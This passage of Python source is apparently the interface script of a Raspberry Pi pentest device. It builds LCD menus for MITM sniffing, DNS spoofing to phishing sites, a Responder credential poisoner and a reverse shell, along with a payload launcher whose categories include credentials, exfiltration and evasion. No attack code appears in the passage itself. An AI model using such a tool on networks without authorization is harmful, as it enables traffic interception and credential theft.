            [" Start MITM & Sniff", Start_MITM],
            [" Stop MITM & Sniff",  Stop_MITM]
        ),

        "aj": (
            [" Start DNSSpoofing",  Start_DNSSpoofing],
            [" Select site",        "ak"],
            [" Stop DNS&PHP",       Stop_DNSSpoofing]
        ),

        "ak": tuple(
            [f" {site}", partial(spoof_site, site)]
            for site in SITES
        ),

        "aw": (
            [" Full WiFi Manager", partial(exec_payload, "utilities/wifi_manager_payload")],
            [" FAST WiFi Switcher", launch_wifi_manager],
            [" INSTANT Toggle 0↔1", quick_wifi_toggle],
            [" Switch Interface", switch_interface_menu],
            [" Show Interface Info", show_interface_info],
            [" WebUI", launch_webui],
            [" Route Control", "awr"],
        ) if WIFI_AVAILABLE else (
            [" WiFi Not Available", lambda: Dialog_info("WiFi system not found\nRun wifi_manager_payload", wait=True)],
        ),

        "awr": (
            [" Show Routing Status", show_routing_status],
            [" Switch to WiFi", switch_to_wifi],
            [" Switch to Ethernet", switch_to_ethernet],
            [" Interface Switcher", launch_interface_switcher]
        ),
    }

    # -----------------------------------------------------------------
    # Helpers
    # -----------------------------------------------------------------
    def GetMenuList(self):
        """Return only the labels of the current menu."""
        return [item[0] for item in self.menu[self.which]]

    def GetMenuIndex(self, inlist):
        """Return the index of the selected label, or -1 if none."""
        x = GetMenuString(inlist)
        if x:
            for i, (label, _) in enumerate(self.menu[self.which]):
                if label == x:
                    return i
        return -1
    # Favoris injection into main menu ----------------------------------------
    _fav_labels = set()  # track injected favorite labels for cleanup

    def _inject_favorites(self):
        """Read favorites.json and inject payloads into main menu 'a' with their original icon."""
        fav_file = os.path.join(default.install_path, "loot/Favorites/favorites.json")
        try:
            with open(fav_file, "r") as f:
                favs = json.load(f).get("favorites", [])
        except Exception:
            favs = []

        # Remove old favorites from menu
        base_menu = [item for item in self.menu["a"] if item[0] not in self._fav_labels]
        self._fav_labels.clear()

        if not favs:
            self.menu["a"] = tuple(base_menu)
            return

        # Build favorite entries using same label format as payload menu: " name"
        # This way MENU_ICONS[" name"] matches and the correct icon is displayed
        fav_entries = []
        stale = []
        for fav_path in sorted(favs):
            # Validate that the payload file still exists on disk
            full = os.path.join(default.payload_path, fav_path)
            if not full.endswith(".py"):
                full += ".py"
            if not os.path.isfile(full):
                stale.append(fav_path)
                continue
            name = os.path.splitext(os.path.basename(fav_path))[0]
            label = f" {name}"  # same format as payload menu
            self._fav_labels.add(label)
            fav_entries.append([label, partial(exec_payload, fav_path)])

        # Auto-clean stale favorites (renamed/deleted payloads)
        if stale:
            cleaned = [f for f in favs if f not in stale]
            try:
                with open(fav_file, "w") as f:
                    json.dump({"favorites": sorted(cleaned)}, f, indent=2)
            except Exception:
                pass

        if fav_entries:
            menu_list = list(base_menu)
            insert_idx = len(menu_list) - 1  # before Lock
            for i, entry in enumerate(fav_entries):
                menu_list.insert(insert_idx + i, entry)
            self.menu["a"] = tuple(menu_list)

    def _inject_autostart(self):
        """Read autostart.json and launch specified payload"""
        autostart_file = default.install_path + "loot/Autostart/autostart.json" # /root/Raspyjack/loot/Autostart/autostart.json
        try:
            with open(autostart_file, "r") as f:
                autostart_payload = json.load(f).get("autostart", "")
        except Exception:
            autostart_payload = ""

        # Validate that the payload file still exists on disk
        full = os.path.join(default.payload_path, autostart_payload)
        if not full.endswith(".py"):
            full += ".py"
 
        # Start payload if configured
        if os.path.isfile(full) and autostart_payload != "":
            exec_payload(autostart_payload)

    # Génération à chaud du sous-menu Payload -------------------------------
    def _build_payload_menu(self):
        """Crée (ou rafraîchit) le menu 'ap' par catégories."""
        self.menu_parent = {}
        category_order = [
            "reconnaissance",
            "wifi",
            "network",
            "credentials",
            "bluetooth",
            "usb",
            "exfiltration",
            "evasion",
            "remote_access",
            "nfc_rfid",
            "sdr",
            "ai",
            "utilities",
            "hardware",
            "games",
            "examples",
        ]

        _CATEGORY_LABELS = {"nfc_rfid": "NFC/RFID", "sdr": "SDR/Radio", "remote_access": "Remote Access"}

        def _label(cat: str) -> str:
            if cat in _CATEGORY_LABELS:
                return f" {_CATEGORY_LABELS[cat]}"
            return f" {cat.replace('_', ' ').title()}"

        categories = list_payloads_by_category()
        menu_items = []

        for cat in category_order:
            scripts = categories.get(cat, [])
            if not scripts:
                continue

            # Separate root-level files from subdirectory files
            root_files = []
            subdirs = {}
            for path in scripts:
                parts = path.split('/')
                if len(parts) > 2 and parts[0] == cat:
                    subdir = parts[1]
                    if subdir not in subdirs:
                        subdirs[subdir] = []
                    subdirs[subdir].append(path)
                else:
                    # Root-level file (in category root or general)
                    root_files.append(path)

            # Build category menu - root files listed directly, subdirs as folders
            cat_items = []

            # Add root files directly to category menu
            for p in root_files:
                cat_items.append([f" {os.path.splitext(os.path.basename(p))[0]}", partial(exec_payload, p)])

            # Add subdirectories as expandable folders
            for subdir in sorted(subdirs.keys()):
                subdir_paths = subdirs[subdir]
                subkey = f"ap_{cat}_{subdir}"
                self.menu[subkey] = tuple(
                    [f" {os.path.splitext(os.path.basename(p))[0]}", partial(exec_payload, p)]
                    for p in subdir_paths
                )
                self.menu_parent[subkey] = f"ap_{cat}"
                cat_items.append([f" 📁 {subdir}", subkey])

            # Only create category menu if there are items
            if cat_items:
                key = f"ap_{cat}"
                self.menu[key] = tuple(cat_items)
                self.menu_parent[key] = "ap"
                menu_items.append([_label(cat), key])

        # Add any unexpected categories at the end
        for cat in sorted(categories.keys()):
            if cat in category_order:
                continue
            scripts = categories[cat]

            root_files = []
            subdirs = {}
            for path in scripts:
                parts = path.split('/')
                if len(parts) > 2:
                    subdir = parts[0]
                    if subdir not in subdirs:
                        subdirs[subdir] = []
                    subdirs[subdir].append(path)
                else:
                    root_files.append(path)

            cat_items = []

            # Add root files directly
            for p in root_files:
                cat_items.append([f" {os.path.splitext(os.path.basename(p))[0]}", partial(exec_payload, p)])

            # Add subdirectories as folders
            for subdir in sorted(subdirs.keys()):
                subdir_paths = subdirs[subdir]
                subkey = f"ap_{cat}_{subdir}"
                self.menu[subkey] = tuple(
                    [f" {os.path.splitext(os.path.basename(p))[0]}", partial(exec_payload, p)]
                    for p in subdir_paths
                )
                self.menu_parent[subkey] = f"ap_{cat}"
                cat_items.append([f" 📁 {subdir}", subkey])

            if cat_items:
                key = f"ap_{cat}"
                self.menu[key] = tuple(cat_items)
                self.menu_parent[key] = "ap"
                menu_items.append([_label(cat), key])

        self.menu["ap"] = tuple(menu_items) or ([" <vide>", lambda: None],)

    def __init__(self):
        # cette fois, `default` est déjà instancié → pas d'erreur
        self.menu_parent = {}
        self._build_payload_menu()
        self._inject_favorites()
        self._inject_autostart()


### Font Awesome Icon Mapping ###
def _load_menu_icons():
    """Load menu icons from menu_icons.json. Returns flat dict."""
    icons = {}
    icon_path = os.path.join(Defaults.install_path, "menu_icons.json")
    try:
        with open(icon_path, "r") as f:
            data = json.load(f)
        for section in ("main_menu", "submenus", "categories", "payloads", "fallbacks"):
            if section in data:
                icons.update(data[section])
    except Exception:
        pass
    return icons


def _menu_icon_for_label(label: str, default_icon: str = "") -> str:
    if not label:
        return default_icon
    normalized = label.strip()
    for candidate in (label, normalized):
        icon = MENU_ICONS.get(candidate, "")
        if icon:
            return icon
    if ":" in label:
        prefix = label.split(":", 1)[0]
        for candidate in (prefix, prefix.rstrip(), prefix.strip()):
            icon = MENU_ICONS.get(candidate, "")
            if icon:
                return icon
    if normalized in SCANS:
        icon = MENU_ICONS.get("__scan__", "")
        if icon:
            return icon
    if normalized in SITES:
        icon = MENU_ICONS.get("__site__", "")
        if icon:
            return icon
    return default_icon

MENU_ICONS = _load_menu_icons()

### Menu Descriptions for Carousel & Inspector Views ###
MENU_DESCRIPTIONS = {
    " Terminal": "Interactive PTY\nshell with history,\nscrollback & quick\ncommands (F1)",
    " Apps": "Launch standalone\nGUI apps with\nkeyboard mouse\n(no full desktop)",
    " Bluetooth": "Pair headphones &\nkeyboards, switch\naudio outputs &\ntest sound",
    " Audio": "Control outputs,\nmics, per-app\nstreams, profiles\n& L/R test tones",
    " Guide": "Full interactive\nmanual for every\nfeature, control\n& payload",
    " Scan Nmap": "Network discovery\nand port scanning\nwith Nmap",
    " Reverse Shell": "Establish reverse\nconnections for\nremote access",
    " Responder": "LLMNR, NBT-NS &\nMDNS poisoner\nfor credentials",
    " MITM & Sniff": "Man-in-the-middle\nattacks and traffic\ninterception",
    " DNS Spoofing": "Redirect DNS\nqueries to fake\nphishing sites",
    " Network info": "Display current\nnetwork interface\nand IP information",
    " WiFi Manager": "Manage wireless\nconnections and\ninterface switching",
    " Other features": "Additional tools\nand system\nconfiguration",
    " Read file": "View captured\ndata and scan\nresults",
    " Payload": "Execute custom\nPython scripts\nand tools",
    " Lock": "Set a PIN or\n6-step sequence,\nlock the device,\nand manage auto-lock",
}


def GetMenuCarousel(inlist, duplicates=False):
    """
    Obsidian Ember Showcase Carousel layout with side ghost cards, descriptions,
    pagination dots, live search, and full keyboard control.
    """
    if not inlist:
        inlist = ["Nothing here :("]

    if duplicates:
        inlist = [f"{i}#{txt}" for i, txt in enumerate(inlist)]

    inlist_original = list(inlist)
    _menu_filter_reset()
    total = len(inlist)
    index = m.select if m.select < total else 0

    while True:
        _render_carousel_view(inlist, index, duplicates=duplicates)

        btn = getButton()

        if isinstance(btn, str) and btn.startswith("_KB_"):
            kb_val = btn[4:]
            if kb_val == "CTRL_T":
                _menu_filter_reset()
                OpenTerminal()
                continue
            elif kb_val == "HOME":
                index = 0
                continue
            elif kb_val == "END":
                index = max(0, total - 1)
                continue
            elif kb_val == "PAGEUP":
                index = (index - 3) % total
                continue
            elif kb_val == "PAGEDOWN":
                index = (index + 3) % total
                continue
            elif kb_val == "ESCAPE":
                if _menu_filter_active:
                    _menu_filter_reset()
                    inlist = list(inlist_original)
                    total = len(inlist)
                    index = 0
                    continue
                if m.which != "a":
                    return ""
                continue
            elif kb_val == "BACKSPACE":
                if _menu_filter_active:
                    _menu_filter_backspace()
                    if _menu_filter:
                        search_source = _get_flat_payload_list()
                        inlist, total = _apply_search_filter(search_source)
                        index = 0
                    else:
                        inlist = list(inlist_original)
                        total = len(inlist)
                        index = 0
                elif m.which != "a":
                    return ""
            elif kb_val == "ENTER":
                if _menu_filter_active and index < total:
                    selected = inlist[index] if not duplicates else inlist[index].split('#', 1)[1]
                    _menu_filter_reset()
                    if selected in _flat_payload_map:
                        exec_payload(_flat_payload_map[selected])
                        return ""
                    m.select = index
                    return selected
            elif kb_val == "s" and _menu_filter_active and not _menu_filter:
                _menu_filter_reset()
                inlist = list(inlist_original)
                total = len(inlist)
                index = 0
            else:
                if not _menu_filter_active:
                    _menu_filter_activate()
                _menu_filter_add(kb_val)
                search_source = _get_flat_payload_list()
                inlist, total = _apply_search_filter(search_source)
                index = 0
            continue

        if btn in ("KEY_LEFT_PIN", "KEY_UP_PIN"):
            index = (index - 1) % total
        elif btn in ("KEY_RIGHT_PIN", "KEY_DOWN_PIN"):
            index = (index + 1) % total
        elif btn == "KEY_PRESS_PIN":
            if index < total:
                selected = inlist[index] if not duplicates else inlist[index].split('#', 1)[1]
                if _menu_filter_active and selected in _flat_payload_map:
                    _menu_filter_reset()
                    exec_payload(_flat_payload_map[selected])
                    return ""
                m.select = index
                _menu_filter_reset()
                return selected
        elif btn == "KEY1_PIN":
            _menu_filter_reset()
            toggle_view_mode()
            return ""
        elif btn == "KEY2_PIN" and m.which == "a" and not _menu_filter_active:
            OpenTerminal()
            continue
        elif btn == "KEY3_PIN":
            if m.which == "a" and _handle_main_menu_key3_double_click():
                continue
            _menu_filter_reset()
            return ""


def GetMenuGrid(inlist, duplicates=False):
    """
    Obsidian Ember App-Card Grid layout with dynamic columns, live search,
    PageUp/PageDown pagination, and full keyboard control.
    """
    GRID_COLS, GRID_ROWS, GRID_ITEMS, _, _ = _grid_layout_dims()

    if not inlist:
        inlist = ["Nothing here :("]

    if duplicates:
        inlist = [f"{i}#{txt}" for i, txt in enumerate(inlist)]

    inlist_original = list(inlist)
    _menu_filter_reset()
    total = len(inlist)
    index = m.select if m.select < total else 0

    while True:
        GRID_COLS, GRID_ROWS, GRID_ITEMS, _, _ = _grid_layout_dims()
        index = max(0, min(index, total - 1))
        _render_grid_view(inlist, index, duplicates=duplicates)

        btn = getButton()

        if isinstance(btn, str) and btn.startswith("_KB_"):
            kb_val = btn[4:]
            if kb_val == "CTRL_T":
                _menu_filter_reset()
                OpenTerminal()
                continue
            elif kb_val == "PAGEUP":
                index = max(0, index - GRID_ITEMS)
                continue
            elif kb_val == "PAGEDOWN":
                index = min(total - 1, index + GRID_ITEMS)
                continue
            elif kb_val == "HOME":
                index = 0
                continue
            elif kb_val == "END":
                index = max(0, total - 1)
                continue
            elif kb_val == "ESCAPE":
                if _menu_filter_active:
                    _menu_filter_reset()
                    inlist = list(inlist_original)
                    total = len(inlist)
                    index = 0
                    continue
                if m.which != "a":
                    return ""
                continue
            elif kb_val == "BACKSPACE":
                if _menu_filter_active:
                    _menu_filter_backspace()
                    if _menu_filter:
                        search_source = _get_flat_payload_list()
                        inlist, total = _apply_search_filter(search_source)
                        index = 0
                    else:
                        inlist = list(inlist_original)
                        total = len(inlist)
                        index = 0
                elif m.which != "a":
                    return ""
            elif kb_val == "ENTER":
                if _menu_filter_active and index < total:
                    selected = inlist[index] if not duplicates else inlist[index].split('#', 1)[1]
                    _menu_filter_reset()
                    if selected in _flat_payload_map:
                        exec_payload(_flat_payload_map[selected])
                        return ""
                    m.select = index
                    return selected
            elif kb_val == "s" and _menu_filter_active and not _menu_filter:
                _menu_filter_reset()
                inlist = list(inlist_original)
                total = len(inlist)
                index = 0
            else:
                if not _menu_filter_active:
                    _menu_filter_activate()
                _menu_filter_add(kb_val)
                search_source = _get_flat_payload_list()
                inlist, total = _apply_search_filter(search_source)
                index = 0
            continue

        if btn == "KEY_UP_PIN":
            if index >= GRID_COLS:
                index -= GRID_COLS
        elif btn == "KEY_DOWN_PIN":
            if index + GRID_COLS < total:
                index += GRID_COLS
            else:
                index = total - 1
        elif btn == "KEY_LEFT_PIN":
            index = (index - 1) % total
        elif btn == "KEY_RIGHT_PIN":
            index = (index + 1) % total
        elif btn == "KEY_PRESS_PIN":
            if index < total:
                selected = inlist[index] if not duplicates else inlist[index].split('#', 1)[1]
                if _menu_filter_active and selected in _flat_payload_map:
                    _menu_filter_reset()
                    exec_payload(_flat_payload_map[selected])
                    return ""
                m.select = index
                _menu_filter_reset()
                return selected
        elif btn == "KEY1_PIN":
            _menu_filter_reset()
            toggle_view_mode()
            return ""
        elif btn == "KEY2_PIN" and m.which == "a" and not _menu_filter_active:
            OpenTerminal()
            continue
        elif btn == "KEY3_PIN":
            if m.which == "a" and _handle_main_menu_key3_double_click():
                continue
            _menu_filter_reset()
            return ""


def toggle_view_mode():
    """Cycle through list -> grid -> carousel -> list view modes."""
    if m.view_mode == "list":
        m.view_mode = "grid"
    elif m.view_mode == "grid":
        m.view_mode = "carousel"
    else:  # carousel
        m.view_mode = "list"
    m.select = 0  # Reset selection when switching views


def boot_health_check():
    """Quick boot-time health check (temp + routed interface/IP)."""
    try:
        routed_iface, _ = _get_routed_info()
        ip, _ = _get_interface_ipv4(routed_iface) if routed_iface else (None, None)
        msg = (
            "[HEALTH] "
            f"Temp: {temp():.0f}C | "
            f"Routed: {routed_iface or 'None'} | "
            f"IP: {ip or 'None'}"
        )
        print(msg)
    except Exception:
        pass


def _check_payload_request():
    """
    Check for a WebUI payload request file and return a payload path if present.
    """
    request_path = "/dev/shm/rj_payload_request.json"
    try:
        if not os.path.isfile(request_path):
            return None
        with open(request_path, "r", encoding="utf-8") as f:
            data = json.load(f)
        os.remove(request_path)
        if data.get("action") == "start" and data.get("path"):
            args = data.get("args", [])
            if args:
                return (str(data["path"]), *args)
            return str(data["path"])
    except Exception:
        pass
    return None


def main():
    # Draw background once
    try:
        draw_lock.acquire()
        _draw_toolbar()
        color.DrawMenuBackground()
        color.DrawBorder()
    finally:
        draw_lock.release()

    start_background_loops()
    threading.Thread(target=boot_health_check, daemon=True).start()
    threading.Thread(target=_refresh_net_summary, daemon=True).start()

    if _lock_is_enabled():
        lock_device("Startup lock")

    print("Booted in %s seconds! :)" % (time.time() - start_time))

    # Menu handling
    # Running functions from menu structure
    while True:
        requested = _check_payload_request()
        if requested:
            exec_payload(requested)
            continue
        # Use different view modes only for main menu ("a"), list view for all submenus
        if m.view_mode in ["grid", "carousel"]:
            if m.view_mode == "grid":
                selected_item = GetMenuGrid(m.GetMenuList())
            else:  # carousel
                selected_item = GetMenuCarousel(m.GetMenuList())

            if selected_item:
                # Find the index of the selected item
                menu_list = m.GetMenuList()
                x = -1
                for i, item in enumerate(menu_list):
                    if item == selected_item:
                        x = i
                        break
            else:
                x = -1
        else:
            x = m.GetMenuIndex(m.GetMenuList())

        if x >= 0:
            m.select = x
            if isinstance(m.menu[m.which][m.select][1], str):
                # Entering submenu: save position, reset to 0
                m._select_stack.append(m.select)
                m.which = m.menu[m.which][m.select][1]
                m.select = 0
            elif isinstance(m.menu[m.which][m.select][1], list):
                _saved_select = m.select
                m.select = 0
                m.menu[m.which][_saved_select][1][0](
                    m.menu[m.which][_saved_select][1][1])
                m.select = _saved_select
            else:
                _saved_select = m.select
                m.select = 0
                m.menu[m.which][_saved_select][1]()
                m.select = _saved_select
        elif len(m.which) > 1:
            # Going back: restore parent position
            if m._select_stack:
                m.select = m._select_stack.pop()
            else:
                m.select = 0
            if m.which.startswith("ap_"):
                m.which = getattr(m, "menu_parent", {}).get(m.which, "ap")
            else:
                m.which = m.which[:-1]


### Default values + LCD init ###
default = Defaults()

LCD = LCD_1in44.LCD()
Lcd_ScanDir = LCD_1in44.SCAN_DIR_DFT
LCD.LCD_Init(Lcd_ScanDir)
LCD_Config.Driver_Delay_ms(5)

# Load responsive Obsidian Ember typography BEFORE splash and main()
text_font = rj_env.load_font(_FONT_PX)
title_font = rj_env.load_font(_TITLE_PX, bold=True)
small_font = rj_env.load_font(_SMALL_PX)
icon_font = rj_env.load_font(_ICON_PX, icon=True)
font = text_font  # Keep backward compatibility

# Render aspect-preserving Obsidian Ember boot splash
_splash = Image.new("RGB", (LCD.width, LCD.height), rj_theme.EMBER_THEME["bg_base"])
_sd = ImageDraw.Draw(_splash)
_cw = min(LCD.width - 16, max(112, int(LCD.width * 0.72)))
_ch = min(LCD.height - 16, max(96, int(LCD.height * 0.68)))
_cx0 = (LCD.width - _cw) // 2
_cy0 = (LCD.height - _ch) // 2
rj_theme.draw_card(
    _sd, (_cx0, _cy0, _cx0 + _cw, _cy0 + _ch),
    fill=rj_theme.EMBER_THEME["bg_surface"],
    outline=rj_theme.EMBER_THEME["border_accent"],
    radius=10 if not _IS_COMPACT else 4,
    accent_left=rj_theme.EMBER_THEME["accent"],
    accent_width=3,
)
_logo_path = os.path.join(default.install_path, 'img/logo.bmp')
_logo_img = None
if os.path.isfile(_logo_path):
    try:
        with Image.open(_logo_path) as _raw_logo:
            _lbox = max(36, min(_cw // 3, _ch - 24))
            _logo_img = ImageOps.contain(_raw_logo.convert("RGB"), (_lbox, _lbox))
    except Exception:
        _logo_img = None

if _logo_img is not None and _IS_WIDESCREEN:
    _lx = _cx0 + 18
    _ly = _cy0 + (_ch - _logo_img.height) // 2
    _splash.paste(_logo_img, (_lx, _ly))
    _tx = _lx + _logo_img.width + 18
    _ty = _cy0 + _ch // 2 - 22
    _big_f = rj_env.load_font(max(18, _TITLE_PX + 6), bold=True)
    _sd.text((_tx, _ty), "EMBERJACK", font=_big_f, fill=rj_theme.EMBER_THEME["accent_bright"])
    _sd.text((_tx, _ty + max(24, _TITLE_PX + 12)), f"{LCD.width}x{LCD.height}  •  Obsidian Ember", font=text_font, fill=rj_theme.EMBER_THEME["text_primary"])
    _sd.text((_tx, _ty + max(42, _TITLE_PX + 28)), "Initializing interface & modules...", font=small_font, fill=rj_theme.EMBER_THEME["text_muted"])
    rj_theme.draw_progress_bar(_sd, (_tx, _cy0 + _ch - 20, _cx0 + _cw - 18, _cy0 + _ch - 14), 0.72)
else:
    _midx = LCD.width // 2
    if _logo_img is not None:
        _splash.paste(_logo_img, (_midx - _logo_img.width // 2, _cy0 + 8))
        _ty = _cy0 + _logo_img.height + 14
    else:
        _ty = _cy0 + _ch // 2 - 14
    _sd.text((_midx, _ty), "EMBERJACK", font=title_font, fill=rj_theme.EMBER_THEME["accent_bright"], anchor="mt")
    _sd.text((_midx, _ty + _TITLE_PX + 6), f"{LCD.width}x{LCD.height}", font=small_font, fill=rj_theme.EMBER_THEME["text_muted"], anchor="mt")

LCD.LCD_ShowImage(_splash, 0, 0)

# Create draw objects BEFORE main() so color functions can use them
image = Image.new("RGB", (LCD.width, LCD.height), color.background)
draw = ImageDraw.Draw(image)

### Defining PINS, threads, loading JSON ###
PINS = {
    "KEY_UP_PIN": 6,
    "KEY_DOWN_PIN": 19,
    "KEY_LEFT_PIN": 5,
    "KEY_RIGHT_PIN": 26,
    "KEY_PRESS_PIN": 13,
    "KEY1_PIN": 21,
    "KEY2_PIN": 20,
    "KEY3_PIN": 16
}
LoadConfig()
m = DisposableMenu()

### Info ###
print("I'm running on " + str(temp()).split('.')[0] + " °C.")
print(time.strftime("%H:%M:%S"))

# Brief splash hold (skipped when headless test imports or RJ_FAST_BOOT=1)
if not os.environ.get("RJ_FAST_BOOT"):
    time.sleep(0.25)




if __name__ == '__main__':
    signal.signal(signal.SIGTERM, lambda *_: Leave())
    try:
        main()
    except KeyboardInterrupt:
        Leave()
